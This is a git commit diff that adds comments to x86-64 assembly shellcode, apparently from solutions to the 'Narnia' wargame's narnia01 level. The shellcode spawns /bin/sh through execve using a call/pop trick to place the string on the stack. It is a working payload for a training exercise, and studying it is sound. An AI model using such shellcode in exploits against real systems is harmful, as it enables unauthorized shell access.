bd573e34a860328276643106636af897f1388e57
Chris Pritchard <chris.pritchard@edpay.nz>
2019-07-02 14:42:48 +1200

    more comments on the assembly

--- Narnia/narnia01/shellcode.asm
+++ Narnia/narnia01/shellcode.asm
@@ -1,7 +1,7 @@
 
 .globl _start
 
-# rdi rsi rdx
+# rax               rdi                     rsi                         rdx
 # 59	sys_execve	const char *filename	const char *const argv[]	const char *const envp[]
 
 _start:
@@ -9,15 +9,15 @@ _start:
 
 shellcode:
     xor     %rdi, %rdi
-    pop     %rdi            # string into first param
+    pop     %rdi            # string into first param (popped off the stack)
 
     xor     %rsi, %rsi      # null for second param
     xor     %rdx, %rdx      # null for third param
 
     xor     %rax, %rax
-    add     $59, %rax       # syscall for execve
+    add     $59, %rax       # syscall number for execve
     syscall
 
 call_shellcode:
-    call    shellcode
-    .ascii  "/bin/sh"
+    call    shellcode       # adds the following instruction onto the stack as the 'next instruction'
+    .ascii  "/bin/sh"       # ends up on the stack, easily accessible by popping
